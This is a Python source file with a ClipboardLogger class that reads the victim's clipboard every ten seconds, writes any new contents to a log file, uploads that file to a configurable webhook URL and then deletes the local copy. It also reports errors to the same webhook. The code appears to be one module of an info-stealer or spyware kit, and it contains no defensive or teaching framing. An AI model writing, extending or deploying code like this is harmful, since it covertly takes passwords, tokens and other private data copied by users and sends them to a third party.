from utils import *

import pyperclip
import time
import os


class ClipboardLogger:
    def __init__(self, software_dir_name, webhook_url):
        self.software_dir_name = software_dir_name
        self.webhook_url = webhook_url
        self.log_file = os.path.join(
            get_logs_path(self.software_dir_name), "clipboard_log.txt"
        )
        self.interval = 10
        self.last_copied = ""

    def log_clipboard(self):
        if not os.path.exists(self.log_file):
            with open(self.log_file, "w") as f:
                f.write("Clipboard History:\n\n")
        try:
            copied = pyperclip.paste()
            if copied == self.last_copied:
                os.remove(self.log_file)
                return
            self.last_copied = copied
            with open(self.log_file, "a") as f:
                f.write(f"{copied}\n")
            send_webhook(
                self.webhook_url, file={"clipboard_logs.txt": open(self.log_file, "rb")}
            )
            os.remove(self.log_file)
        except Exception as e:
            send_webhook(self.webhook_url, f"```❌ Error logging clipboard: {e}```")

    def start(self):
        while True:
            self.log_clipboard()
            time.sleep(self.interval)
